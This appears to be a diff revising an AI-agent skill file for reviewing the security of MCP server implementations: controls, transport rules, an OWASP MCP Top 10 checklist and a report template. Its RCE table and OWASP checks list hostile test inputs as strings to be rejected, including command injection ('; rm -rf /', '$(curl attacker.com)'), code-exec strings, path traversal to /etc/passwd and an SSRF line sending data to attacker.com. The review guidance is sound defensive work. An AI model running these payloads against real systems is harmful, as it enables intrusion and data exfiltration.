@@ -1,317 +1,196 @@
 ---
-name: "mcp-implementation-security-review"
+name: mcp-implementation-security-review
 description: >-
-  Review the implementation source code of MCP (Model Context Protocol) servers, clients, and tool
-  handlers against a security baseline — authentication, sessions, rate limiting, input-schema
-  validation, official-SDK usage, RCE vectors, and the OWASP MCP Top 10 — producing a report with
-  file/line evidence. Use this skill when: - Reviewing an MCP server implementation for security
-  before release - Checking a server against the baseline controls (MCP-01 to MCP-05) and the OWASP
-  MCP Top 10 - Auditing tools for RCE vectors (command/code injection, unsafe deserialization, path
-  traversal, SSTI, dependency hijacking, SSRF) - Verifying auth, session, rate-limiting, and
-  input-validation controls on a network-exposed server - Reviewing MCP client code that handles
-  untrusted server responses and session IDs - Requests like "review this MCP server for security" or
-  "is my MCP server implementation secure?"
+  Review MCP server, client, and tool-handler source code for security. Use when asked to review an MCP server before release, audit Model Context Protocol implementation controls MCP-01 through MCP-05, check OWASP MCP Top 10, inspect auth, sessions, rate limiting, input-schema validation, official SDK use, or RCE vectors with file and line evidence.
 ---
-# MCP Implementation Security Review
 
-## Process
+# MCP implementation security review
 
-### Step 1 — Classify the target
-- Check **MCP protocol version [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26) or later** (current: [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)). Flag older versions as a finding but continue the review.
-- Determine whether the target is a **server** or **client**.
-- Classify transport as **network-exposed** or **local-only** using the transport reference below.
-- Record transport, protocol version, and whether sessions exist.
+Classify an MCP implementation, evaluate applicable baseline controls, RCE vectors, and OWASP MCP Top 10 risks, then produce an evidence-backed security report with code findings and manual follow-ups.
 
-**Completion criterion:** Target type, protocol status, and transport are identified.
+## When to invoke
 
-### Step 2 — Filter false positives
-- Apply the **False Positive Filters** before opening findings.
-- Keep docs only when they describe the repo's own server behavior, deployment, transport, or auth posture.
-- For framework/SDK repositories, scope findings to the **default configuration** and **public API surface**.
+- "Review this MCP server for security."
+- "Is my MCP server implementation secure?"
+- "Audit our MCP tools for RCE vectors."
+- "Check this Model Context Protocol server against MCP-01 to MCP-05."
+- "Review MCP client code that handles session IDs and server responses."
 
-**Completion criterion:** Remaining evidence is in-scope code, repo-owned docs, or public API behavior.
+## Prerequisites and context
 
-### Step 3 — Check baseline controls
-- For **network-exposed servers**, check **MCP-01** through **MCP-05**.
-- For **local/STDIO servers**, do not mark baseline controls PASS/FAIL; give best-practice notes and continue to RCE review.
-- For **clients**, only review token/session handling explicitly visible in client code; do not apply the server baseline unless the user asks for client-side risk review.
+- Check protocol version `2025-03-26` or later; current reference is `2025-11-25`.
+- Treat the target as server, client, or mixed implementation before applying controls.
+- Do not assume STDIO when transport is unclear; mark NEEDS INVESTIGATION and identify the missing evidence.
 
-**Completion criterion:** Each applicable control has a supported status.
+## Procedure
 
-### Step 4 — Check RCE vectors
-- Review all 7 RCE vectors.
-- Mark each vector **SAFE**, **AT RISK**, or **N/A**.
-- Prefer direct evidence over inference; the RCE Vectors table below enumerates the patterns to look for.
+1. Classify the target type, MCP protocol status, transport, exposure, and session usage.
+2. Apply false positive filters before opening findings.
+3. For network-exposed servers, score MCP-01 through MCP-05; for local/STDIO servers, give best-practice notes and still review RCE; for clients, review token/session handling explicitly visible in client code.
+4. Review all 7 RCE vectors and mark SAFE, AT RISK, or N/A.
+5. Evaluate all 10 OWASP MCP Top 10 risks and reuse baseline-control evidence where it fully covers a risk.
+6. Report with file/line evidence, separate manual follow-ups, and use NEEDS INVESTIGATION for missing deployment, identity-provider, log, or runtime evidence.
 
-**Completion criterion:** Every relevant tool has an RCE result or explicit N/A.
+## Classification rules
 
-### Step 5 — Check OWASP MCP Top 10
-- Evaluate all 10 OWASP risks below.
-- If a control from Step 3 already fully covers an OWASP risk, reference that result rather than re-checking.
-- For local/STDIO servers, mark network-dependent OWASP risks (MCP07, MCP09) as N/A.
-- Mark each risk PASS, FAIL, or NEEDS INVESTIGATION.
+| Decision | Rule |
+| --- | --- |
+| Network-exposed server | Apply all 5 controls, then RCE and OWASP checks. |
+| Local/STDIO server | Do not mark baseline controls PASS/FAIL; provide best practices and still run RCE because tool input can execute locally. |
+| Client | Review received-token handling and refusal to trust server-provided session IDs; do not force server controls unless asked. |
+| Reverse proxy or container exposure | If traffic can reach the server over a network, treat it as network-exposed even if the inner binding is localhost. |
+| Ambiguous auth coverage | Auth middleware exists but endpoint coverage is unclear → NEEDS INVESTIGATION. |
+| Undeterminable transport | Flag for manual review; do not default to STDIO. |
 
-**Completion criterion:** All 10 OWASP risks have outcomes supported by observable evidence or referenced from Step 3.
-
-### Step 6 — Report
-- Use the **Compliance Output Format** below.
-- Include file/line references in every justification.
-- Separate code findings from manual follow-ups.
-- If evidence is incomplete, use **NEEDS INVESTIGATION** and name the missing artifact.
-
-**Completion criterion:** The report includes controls, RCE, optional OWASP, and actions.
-
-## Reference
-
-### Decision rules
-- **Network-exposed server:** Apply **all 5 controls**, then run RCE and requested OWASP checks.
-- **Local/STDIO server:** Give **best-practice guidance only** for the 5 controls; still run RCE because tool input can execute locally.
-- **Client:** Review received-token handling and refusal to trust server-provided session IDs; do not force server controls unless asked.
-- **Reverse proxy or container exposure:** If traffic can reach the server over a network, treat it as **network-exposed** even if inner binding is localhost.
-- **Unclear evidence:** Do not guess. Mark **NEEDS INVESTIGATION** and say what must be verified manually.
-- **Ambiguous auth coverage:** Auth middleware exists but it is unclear whether it covers MCP endpoints → mark **NEEDS INVESTIGATION**.
-- **Undeterminable transport:** If transport cannot be established from code, flag for manual review and do **not** assume STDIO — defaulting to STDIO would wrongly skip the server controls.
-
-### Transport classification
-
-**Network-exposed (enforce all controls):**
-
-| Pattern | Transport |
-|---|---|
+| Network-exposed pattern | Transport |
+| --- | --- |
 | `transport="http"` or `transport="sse"` | HTTP/SSE |
 | `StreamableHttpServerTransport` | HTTP (TS/JS) |
 | `SSEServerTransport` | SSE (TS/JS) |
 | `WithHttpTransport()` | HTTP (C#) |
 | `host="0.0.0.0"` | All-interfaces binding |
-| Express `.listen(port)` with MCP routes | HTTP (default `0.0.0.0`) |
+| Express `.listen(port)` with MCP routes | HTTP, default `0.0.0.0` |
 | `EXPOSE` in Dockerfile + MCP server | Network-exposed |
 
-**Local-only (best practices only):**
-
-| Pattern | Transport |
-|---|---|
+| Local-only pattern | Transport |
+| --- | --- |
 | `StdioServerTransport` | STDIO (TS/JS) |
 | `WithStdioServerTransport()` | STDIO (C#) |
 | `transport="stdio"` | STDIO |
-| `mcp.run()` with no args (Python FastMCP) | STDIO default |
+| `mcp.run()` with no args | Python FastMCP STDIO default |
 | `.vscode/mcp.json` with `command` key and no URL | STDIO child process |
 
-**Host binding gotchas:**
-
 | Binding | Actual exposure |
-|---|---|
+| --- | --- |
 | `host="0.0.0.0"` | Network-exposed |
 | `host="127.0.0.1"` or `localhost` | Local-only |
 | No explicit host (Express/Node) | Defaults to `0.0.0.0` |
-| No explicit host (Python FastMCP) | Depends on transport — verify |
-| Docker `ports: "8000:8000"` | Network-exposed even if the process binds `127.0.0.1` inside the container |
+| No explicit host (Python FastMCP) | Depends on transport; verify. |
+| Docker `ports: "8000:8000"` | Network-exposed even if the process binds `127.0.0.1` inside the container. |
 
-### False Positive Filters
+## False positive filters
 
 | FP pattern | How to detect |
-|---|---|
-| `.github/skills/` templates | Path contains `.github/skills/` — skill template, not server code |
-| Vendored SDK / OSS copies | File defines `class FastMCP`, `class McpServer`, or path is in `node_modules/`, `vendor/` |
-| MCP client configs | `.vscode/mcp.json` with `inputs`/`servers` but no server code |
-| Documentation / tutorials | `.md`, `.rst` with code fences unrelated to the repo's own server |
-| Outbound-only auth libraries | `DefaultAzureCredential`, service account JSON, or similar used only for outbound auth |
+| --- | --- |
+| `.github/skills/` templates | Path contains `.github/skills/`; skill template, not server code. |
+| Vendored SDK / OSS copies | File defines `class FastMCP`, `class McpServer`, or path is in `node_modules/`, `vendor/`. |
+| MCP client configs | `.vscode/mcp.json` with `inputs`/`servers` but no server code. |
+| Documentation / tutorials | `.md`, `.rst` with code fences unrelated to the repo's own server. |
+| Outbound-only auth libraries | `DefaultAzureCredential`, service account JSON, or similar used only for outbound auth. |
 
-Docs describing the repo's **own** server behavior, transport, auth posture, or deployment are **not** false positives.
+Keep documentation when it describes the repo's own server behavior, deployment, transport, or auth posture.
 
-## Controls Reference
+## Baseline controls
 
-### MCP-01 — Identity isolation
-**Scope:** Remote MCP servers
+| Control | Scope | Passing condition | Pitfall |
+| --- | --- | --- | --- |
+| MCP-01 Identity isolation | Remote MCP servers | Authenticate every inbound request with a trusted identity provider; authorize at the server boundary; use a unique server-specific application identity and audience/resource identifier; outbound calls use independently scoped service credentials or on-behalf-of flow. Unauthenticated discovery endpoints are metadata-only: `/.well-known/oauth-protected-resource`, `/.well-known/oauth-authorization-server`, `/.well-known/openid-configuration`. | Shared application identities or forwarded caller tokens create confused-deputy paths. |
+| MCP-02 Sessions | Remote MCP servers that support sessions | Per-request auth remains required; session IDs are opaque, CSPRNG-generated, unpredictable, bound to authenticated context, never in URLs, and never privileges. No sessions → N/A; SDK-managed `Mcp-Session-Id` not visible → NEEDS INVESTIGATION. | Treating a session ID as a bearer credential. |
+| MCP-03 Rate limits | MCP servers and tools | Enforce limits at MCP runtime on discovery and invocation, keyed by identity and session, stricter for mutation/high-cost tools, fail closed with HTTP 429 and `Retry-After`. | Gateway-only throttling or one flat bucket. |
+| MCP-04 Schema validation | Servers exposing structured arguments | Validate all tool args before execution with explicit schemas covering types, required fields, enums, bounds, and `additionalProperties: false` or equivalent; invalid input returns 400/MCP error and no backend action. | Client-only validation or extra properties. |
+| MCP-05 SDK-first | Remote MCP servers | Use an official MCP SDK: Tier 1 TypeScript (`modelcontextprotocol/typescript-sdk`), Python (`modelcontextprotocol/python-sdk`), C#/.NET (`modelcontextprotocol/csharp-sdk`), Go (`modelcontextprotocol/go-sdk`); Tier 2/3 Java, Kotlin, Rust, Swift, PHP, Ruby SDKs. If not official, mark NEEDS INVESTIGATION and require direct control evidence. | Hand-rolled HTTP/SSE often misses per-request auth, throttling, or validation. |
 
-**Condition**
-- Authenticate every inbound request with a trusted identity provider and enforce authorization at the server boundary; do not infer auth from session IDs, prior requests, or network location.
-- Use a **unique server-specific application identity** and audience/resource identifier; outbound calls use independently scoped service credentials or on-behalf-of flow where required, never the inbound token.
-- Unauthenticated discovery endpoints are allowed only for metadata-only OAuth/MCP bootstrapping: `/.well-known/oauth-protected-resource`, `/.well-known/oauth-authorization-server`, `/.well-known/openid-configuration`.
+Starting MCP-03 thresholds: read-only/listing 100/min per identity and 200/min per session; mutation/write 10/min and 20/min; high-cost compute 5/min and 10/min; tool discovery 30/min and 60/min. Tune to actual load, downstream limits, and cost.
 
-**What to check**
-- Token validation and authorization middleware run on every MCP route; authorization distinguishes tool invoke, read-only, and admin operations if present.
-- Identity config shows a dedicated application/client/resource ID and audience; outbound clients acquire their own tokens and never copy inbound `Authorization`.
-- Discovery endpoints return metadata only and cannot execute tools or expose protected data.
 
-**Key pitfall:** Shared application identities or forwarded caller tokens break identity isolation and create confused-deputy paths.
+## Review vocabulary
 
-### MCP-02 — Sessions
-**Scope:** Remote MCP servers that support sessions
+Preserve these MCP security terms because they affect scoring: `PASS/FAIL**`, `N/A**`, `N/A**.`, `OAuth/MCP`, `Authorization`, `application/client/resource`, `auth/authz`, `client-only`, `client-side`, `command/code`, `correlation/continuity`, `expired/invalid`, `framework/SDK`, `generation/binding`, `hand-rolled`, `in-scope`, `input-validation`, `instruction-bearing`, `mutation-capable`, `network-dependent`, `rate-limiting`, `re-checking`, `read/write/execute`, `repo-owned`, `scopes/roles`, `security/release`, `state-changing`, `string-built`, `time-based`, `transport/SDK`, `under-protects`, `v4/CSPRNG`, `GUID`, `60/min`, and `write/high-cost`.
 
-**Applicability**
-- No session identifiers issued or used anywhere → mark **N/A** (per-request auth is still required; see MCP-01).
-- Sessions managed by the transport/SDK (e.g., Streamable HTTP `Mcp-Session-Id`) but generation/binding not visible in source → mark **NEEDS INVESTIGATION**, not FAIL.
-- Session identifiers present in code → score **PASS/FAIL** against the conditions below.
+Official SDK package names include `modelcontextprotocol/java-sdk`, `modelcontextprotocol/kotlin-sdk`, `modelcontextprotocol/rust-sdk`, `modelcontextprotocol/swift-sdk`, `modelcontextprotocol/php-sdk`, and `modelcontextprotocol/ruby-sdk`; shorthand labels include `java-sdk`, `kotlin-sdk`, `rust-sdk`, `swift-sdk`, `php-sdk`, and `ruby-sdk`.
 
-**Condition**
-- Authenticate and authorize **every** request; session state never substitutes for token validation.
-- Session IDs are opaque correlation/continuity tokens only; they do not grant privileges, encode authorization, or bypass auth.
-- Session IDs are CSPRNG-generated, unpredictable, bound to an authenticated context, and never embedded in URLs.
-
-**What to check**
-- Middleware validates tokens per request, not only when a session starts.
-- Authorization logic never trusts a session ID alone; loss or reuse of a session ID must not grant access.
-- Session creation uses random IDs (GUID v4/CSPRNG acceptable; sequential or time-based IDs are not).
-
-**Key pitfall:** Treating a session ID as a bearer credential turns a correlation token into authentication.
-
-### MCP-03 — Rate limits
-**Scope:** MCP servers and tools
-
-**Condition**
-- Enforce rate limits and abuse protection on tool discovery and tool invocation.
-- Enforce limits **at the MCP server runtime**, not only at a gateway; partition by authenticated identity and by session where sessions exist.
-- Apply stricter limits to mutation-capable and high-cost tools; when limits are exceeded, fail closed with **HTTP 429** and **Retry-After** and do not execute the tool.
-
-**What to check**
-- Rate-limit middleware or equivalent is present on discovery and invocation endpoints in server code, not just in ingress or proxy config.
-- Limits are keyed by identity and session, with tighter budgets for write/high-cost operations.
-- Exceeded requests stop before backend action and return 429 with Retry-After.
-
-**Starting thresholds** (tune to actual load, downstream limits, and cost):
-
-| Tool type | Per-identity | Per-session | Notes |
-|---|---|---|---|
-| Read-only / listing | 100/min | 200/min | Lower if downstream APIs are sensitive |
-| Mutation / write | 10/min | 20/min | Stricter for state-changing ops |
-| High-cost compute | 5/min | 10/min | Cost-weighted; watch cloud spend |
-| Tool discovery | 30/min | 60/min | Prevents enumeration abuse |
-
-**Key pitfall:** Gateway-only throttling or one flat bucket leaves bypasses and under-protects expensive tools.
-
-### MCP-04 — Schema validation
-**Scope:** MCP servers exposing tools with structured arguments
-
-**Condition**
-- Validate **all** tool arguments against explicit schemas **before execution**.
-- Schemas define types, required fields, enums, and bounds, and reject unspecified properties by default (`additionalProperties: false` or equivalent).
-- Validation runs server-side on every invocation; invalid input fails closed with a 400/MCP error and no backend action.
-
-**What to check**
-- Each tool descriptor has a schema covering types, required fields, enums, bounds, and property restrictions.
-- Validation occurs at the server boundary on every call, not only in clients, gateways, or downstream services.
-- Negative tests reject malformed input, extra properties, and bounds violations.
-
-**Key pitfall:** Allowing extra properties or client-only validation creates hidden attack surface and scope creep.
-
-### MCP-05 — SDK-first
-**Scope:** Remote MCP servers
-
-**Condition**
-- Build remote MCP servers on an **official MCP SDK** for your server's language:
-  - **Tier 1 (fully supported):** TypeScript (modelcontextprotocol/typescript-sdk), Python (modelcontextprotocol/python-sdk), C#/.NET (modelcontextprotocol/csharp-sdk), Go (modelcontextprotocol/go-sdk)
-  - **Tier 2/3 (developing):** Java (modelcontextprotocol/java-sdk), Kotlin (modelcontextprotocol/kotlin-sdk), Rust (modelcontextprotocol/rust-sdk), Swift (modelcontextprotocol/swift-sdk), PHP (modelcontextprotocol/php-sdk), Ruby (modelcontextprotocol/ruby-sdk)
-- If not using an official SDK, mark MCP-05 as NEEDS INVESTIGATION.
-- Keep the SDK current and patched, and verify which controls are automatic versus manual.
-
-**What to check**
-- Dependencies reference an official MCP SDK rather than a hand-rolled HTTP/SSE stack.
-- If no SDK is used, the repo contains direct evidence for auth/authz, sessions, rate limits, and schema validation.
-- Dependency pinning and update hygiene show the SDK is maintained.
-
-**Key pitfall:** Hand-rolled servers often miss one "small" primitive—per-request auth, throttling, or validation—and the gaps compound.
-
-## RCE Vectors
+## RCE vectors
 
 | Vector | Dangerous code | Safe alternative | Test payload | CWE |
-|---|---|---|---|---|
-| Command injection | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` must be rejected or treated literally | CWE-78 |
-| Dynamic code evaluation | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | Sandboxed parser, AST-based evaluation, or predefined allowlist | `__import__('os').system('whoami')`, `require('child_process').exec('id')` must be rejected | CWE-94, CWE-95 |
-| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input | Crafted serialized payloads must be rejected or safely handled | CWE-502 |
-| Path traversal | `fs.readFile(args.path)` without validation, `open(user_path, 'w')` | Canonicalize and enforce an allowlisted base directory before read/write/execute | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` must be rejected | CWE-22 |
-| SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | Never use user input as template source; use predefined templates with parameters only | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` must not render `49` | CWE-1336 |
-| Dependency hijacking | Unpinned deps such as `"lodash": "^4.0.0"`; internal package names resolvable from public registries | Pin exact versions, keep lock files with integrity hashes, use trusted/scoped registries, verify signatures where available | `npm audit`, `pip audit`, or `dotnet list package --vulnerable`; review for CVEs and suspicious packages | CWE-829 |
-| SSRF | `requests.get(user_param)`, `fetch(user_input)`, `HttpClient.GetAsync(user_input)` | Allowlist schemes/domains, block RFC1918 and link-local targets, validate URLs before sending | `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://attacker.com/?data=stolen` must be rejected | CWE-918 |
+| --- | --- | --- | --- | --- |
+| Command injection | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` must be rejected or literal. | CWE-78 |
+| Dynamic code evaluation | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | Sandboxed parser, AST-based evaluation, or predefined allowlist. | `__import__('os').system('whoami')`, `require('child_process').exec('id')` must be rejected. | CWE-94, CWE-95 |
+| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input. | Crafted serialized payloads must be rejected or safely handled. | CWE-502 |
+| Path traversal | `fs.readFile(args.path)`, `open(user_path, 'w')` | Canonicalize and enforce an allowlisted base directory before read/write/execute. | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` must be rejected. | CWE-22 |
+| SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | Never use user input as template source; use predefined templates with parameters only. | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` must not render `49`. | CWE-1336 |
+| Dependency hijacking | Unpinned deps such as `"lodash": "^4.0.0"`; internal package names resolvable from public registries. | Pin exact versions, keep lock files with integrity hashes, use trusted/scoped registries, verify signatures where available. | `npm audit`, `pip audit`, or `dotnet list package --vulnerable`; review CVEs and suspicious packages. | CWE-829 |
+| SSRF | `requests.get(user_param)`, `fetch(user_input)`, `HttpClient.GetAsync(user_input)` | Allowlist schemes/domains, block RFC1918 and link-local targets, validate URLs before sending. | `http://169.254.169.254/latest/meta-data/`, `http://localhost:8080/admin`, `http://attacker.com/?data=stolen` must be rejected. | CWE-918 |
 
 ## OWASP MCP Top 10
 
-**MCP01:2025 — Token Mismanagement & Secret Exposure**
-Test: Search for hardcoded secrets and token logging; verify secrets come from env vars or a secrets manager; verify short-lived/rotated tokens.
-Pass: No hardcoded secrets, sensitive fields redacted, short-lived/rotated tokens. Fail: Hardcoded secrets, token logging, or long-lived tokens without rotation.
-
-**MCP02:2025 — Privilege Escalation via Scope Creep**
-Test: Review scopes/roles; confirm least privilege and per-request authorization; reject wildcard admin scopes unless justified; check for runtime capability expansion.
-Pass: Least-privilege scopes, per-request authorization, no runtime capability expansion. Fail: Broad scopes, one-time auth only, or self-escalating tools.
-
-**MCP03:2025 — Tool Poisoning**
-Test: Check whether tool definitions are static and server-controlled, whether tools can alter metadata, and whether outputs contain LLM-parseable instructions.
-Pass: Static server-controlled definitions and data-only outputs. Fail: External metadata sources or outputs with embedded instructions.
-
-**MCP04:2025 — Supply Chain Attacks & Dependency Tampering**
-Test: Check for lock files, exact pinning, suspicious `postinstall` scripts, dependency audit results, and trusted registries.
-Pass: Pinned deps, committed lock file, no known vulnerabilities, no suspicious post-install scripts. Fail: Unpinned deps, no lock file, unpatched CVEs, or untrusted registries.
-
-**MCP05:2025 — Command Injection & Execution**
-Test: Search for shell execution APIs and string-built commands; trace whether tool input reaches shell execution; test `; ls`, `$(whoami)`, `| cat /etc/passwd`.
-Pass: No shell execution from untrusted input, or only parameterized allowlisted execution. Fail: User input reaches shell commands, `shell=True` with formatted strings, or unsafe concatenation.
-
-**MCP06:2025 — Prompt Injection via Contextual Payloads**
-Test: Check whether tool output goes back to the LLM, whether external content is sanitized/truncated/sandboxed, and whether chained tool calls are guarded; test adversarial instruction-bearing output.
-Pass: Tool outputs are data, untrusted content is sanitized/truncated/sandboxed, and chaining has guardrails. Fail: Raw external content returns to the model and there are no chaining limits.
-
-**MCP07:2025 — Insufficient Authentication & Authorization**
-Test: Send requests without auth and with expired/invalid tokens; verify per-tool authorization; confirm auth is enforced in the server, not only at the gateway.
-Pass: All endpoints require valid auth, per-tool authorization exists, and enforcement happens server-side. Fail: Any unauthenticated access, missing per-tool auth, or gateway-only enforcement.
-
-**MCP08:2025 — Lack of Audit and Telemetry**
-Test: Invoke a tool and confirm logs capture caller identity, tool name, and timestamp; trigger an error and confirm useful context; verify centralized logging and alerting.
-Pass: Tool invocations are logged with identity, logs are centralized, and alerts exist. Fail: Missing logs, no caller identity, local-only logging, or no alerting.
-
-**MCP09:2025 — Shadow MCP Servers**
-Test: Verify the server exists in service inventory; inspect for undocumented MCP endpoints or exposed non-standard ports; check dev/staging isolation; verify an owner and review trail.
-Pass: All servers are inventoried, isolated appropriately, and owned. Fail: Undocumented servers, dev/test exposure into production networks, or no ownership.
-
-**MCP10:2025 — Context Injection & Over-Sharing**
-Test: Inspect tool responses for data minimization; check for PII or full objects when only subsets are needed; verify context isolation.
-Pass: Minimal data is returned, sensitive fields are masked/excluded, and context is isolated. Fail: Full objects are returned unnecessarily, PII is exposed, or context is shared across users.
-
-## Compliance Output Format
-
-In every summary table below, the **Justification** cell must cite specific file/line evidence for the status.
-
-### Control summary
-
-| Control | Name | Status | Justification |
-|---|---|---|---|
-| MCP-01 | Auth & Identity isolation | PASS / FAIL / NEEDS INVESTIGATION / N/A | … |
-| MCP-02 | Secure Session Management | … | … |
-| MCP-03 | Rate limiting & abuse protection | … | … |
-| MCP-04 | Input schema validation | … | … |
-| MCP-05 | Production SDK usage | … | … |
-
-Use **PASS** only when the code clearly satisfies the control. Use **FAIL** when the violation is observable. Use **NEEDS INVESTIGATION** when compliance depends on deployment config, identity-provider state, logs, or other evidence not visible in source.
-
-### RCE summary
-
-| Vector | Status | Justification |
-|---|---|---|
-| Command injection | SAFE / AT RISK / N/A | … |
-| Dynamic code evaluation | … | … |
-| Unsafe deserialization | … | … |
-| Path traversal | … | … |
-| SSTI | … | … |
-| Dependency hijacking | … | … |
-| SSRF | … | … |
-
-### OWASP summary
-
-| Risk | Status | Justification |
-|---|---|---|
-| MCP01:2025 | PASS / FAIL / NEEDS INVESTIGATION | … |
-| MCP02:2025 | … | … |
-| MCP03:2025 | … | … |
-| MCP04:2025 | … | … |
-| MCP05:2025 | … | … |
-| MCP06:2025 | … | … |
-| MCP07:2025 | … | … |
-| MCP08:2025 | … | … |
-| MCP09:2025 | … | … |
-| MCP10:2025 | … | … |
-
-### Manual follow-ups
-List every check that could not be fully resolved from source code, specifying what artifact or access is needed to verify it.
+| Risk | Test | Pass | Fail |
+| --- | --- | --- | --- |
+| MCP01:2025 Token Mismanagement & Secret Exposure | Search for hardcoded secrets and token logging; verify env vars or secrets manager and rotation. | No hardcoded secrets, redaction, short-lived/rotated tokens. | Hardcoded secrets, token logging, or long-lived tokens without rotation. |
+| MCP02:2025 Privilege Escalation via Scope Creep | Review scopes, roles, per-request authorization, wildcard admin scopes, runtime capability expansion. | Least privilege, per-request authz, no runtime expansion. | Broad scopes, one-time auth only, self-escalating tools. |
+| MCP03:2025 Tool Poisoning | Check static server-controlled tool definitions and data-only outputs. | Static definitions and data-only outputs. | External metadata sources or outputs with embedded instructions. |
+| MCP04:2025 Supply Chain Attacks & Dependency Tampering | Check lock files, exact pinning, suspicious `postinstall` scripts, audit results, trusted registries. | Pinned deps, committed lock, no known vulnerabilities, no suspicious post-install scripts. | Unpinned deps, no lock, unpatched CVEs, untrusted registries. |
+| MCP05:2025 Command Injection & Execution | Search shell execution APIs and trace tool input to shell; test `; ls`, `$(whoami)`, `| cat /etc/passwd`. | No shell execution from untrusted input or parameterized allowlisted execution only. | User input reaches shell commands, `shell=True` formatted strings, unsafe concatenation. |
+| MCP06:2025 Prompt Injection via Contextual Payloads | Check tool output returned to LLM, external content sanitization/truncation/sandboxing, and chained tool guardrails. | Data-only outputs, untrusted content sanitized/truncated/sandboxed, chaining guarded. | Raw external content returns to model without chaining limits. |
+| MCP07:2025 Insufficient Authentication & Authorization | Send unauthenticated and expired/invalid-token requests; verify per-tool auth in server. | All endpoints require valid auth and per-tool authorization server-side. | Any unauthenticated access, missing per-tool auth, or gateway-only enforcement. |
+| MCP08:2025 Lack of Audit and Telemetry | Invoke tool and error path; inspect caller identity, tool name, timestamp, centralized logs, alerts. | Tool invocations logged with identity, centralized logs, alerts. | Missing logs, no identity, local-only logging, no alerting. |
+| MCP09:2025 Shadow MCP Servers | Verify service inventory, undocumented endpoints, non-standard ports, dev/staging isolation, owner, review trail. | Inventoried, isolated, owned servers. | Undocumented servers, exposed dev/test, no ownership. |
+| MCP10:2025 Context Injection & Over-Sharing | Inspect data minimization, PII, full objects, context isolation. | Minimal data, sensitive fields masked/excluded, isolated context. | Full objects, PII exposure, shared context. |
 
 ## Exception process
-- **Document the gap:** Identify the unmet control, the exact deviation, residual risk, and any compensating controls.
-- **Get explicit approval:** Route the exception through security/release approval with an owner and an expiration or review date.
-- **Track and re-evaluate:** Record the approved exception with compliance results and revisit it on expiry or whenever the server, tools, traffic profile, or exposure changes.
+
+- Document the gap, exact deviation, residual risk, and compensating controls.
+- Get explicit security or release approval with an owner and expiration or review date.
+- Track and re-evaluate on expiry or whenever the server, tools, traffic profile, or exposure changes.
+
+## Output template
+
+```markdown
+## MCP implementation security review — <target>
+
+**Target type:** server | client | mixed
+**Transport:** HTTP | SSE | STDIO | unknown
+**Protocol:** <version and status>
+**Exposure:** network-exposed | local-only | needs investigation
+
+### Control summary
+| Control | Name | Status | Justification |
+|---|---|---|---|
+| MCP-01 | Auth & Identity isolation | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
+| MCP-02 | Secure Session Management | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
+| MCP-03 | Rate limiting & abuse protection | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
+| MCP-04 | Input schema validation | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
+| MCP-05 | Production SDK usage | PASS / FAIL / NEEDS INVESTIGATION / N/A | <file:line evidence> |
+
+### RCE summary
+| Vector | Status | Justification |
+|---|---|---|
+| Command injection | SAFE / AT RISK / N/A | <file:line evidence> |
+| Dynamic code evaluation | SAFE / AT RISK / N/A | <file:line evidence> |
+| Unsafe deserialization | SAFE / AT RISK / N/A | <file:line evidence> |
+| Path traversal | SAFE / AT RISK / N/A | <file:line evidence> |
+| SSTI | SAFE / AT RISK / N/A | <file:line evidence> |
+| Dependency hijacking | SAFE / AT RISK / N/A | <file:line evidence> |
+| SSRF | SAFE / AT RISK / N/A | <file:line evidence> |
+
+### OWASP summary
+| Risk | Status | Justification |
+|---|---|---|
+| MCP01:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP02:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP03:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP04:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP05:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP06:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP07:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP08:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP09:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+| MCP10:2025 | PASS / FAIL / NEEDS INVESTIGATION | <evidence> |
+
+### Manual follow-ups
+- <missing artifact or access required>
+```
+
+## Quality gate
+
+- [ ] Target type, protocol status, transport, exposure, and session usage are identified or marked NEEDS INVESTIGATION.
+- [ ] False positives are filtered before findings are opened.
+- [ ] Network-exposed servers have MCP-01 through MCP-05 scored with file/line evidence.
+- [ ] Local/STDIO servers are not falsely scored PASS/FAIL for network-only controls but are still reviewed for RCE.
+- [ ] Every RCE vector is SAFE, AT RISK, or N/A with evidence.
+- [ ] Every OWASP MCP Top 10 risk has PASS, FAIL, or NEEDS INVESTIGATION.
